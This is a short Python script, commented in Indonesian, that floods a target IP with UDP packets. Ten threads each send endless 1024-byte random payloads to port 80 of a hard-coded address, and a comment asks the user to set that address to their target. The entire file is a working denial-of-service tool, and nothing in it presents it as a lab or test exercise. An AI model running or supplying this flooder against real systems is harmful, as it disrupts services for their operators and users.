import socket
from concurrent.futures import ThreadPoolExecutor
import random


def flood(ip: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_port = 80
    data = random._urandom(1024)

    while True:
        try:
            sock.sendto(data, (ip, target_port))
        except KeyboardInterrupt:
            print("Program stopped by user!")
            break
        except:
            pass


if __name__ == "__main__":
    target_ip = "172.19.0.2"  # Sesuaikan dengan IP target Anda
    thread_count = 10

    print(f"Menjalankan {thread_count} thread ke {target_ip}...")

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(flood, target_ip)
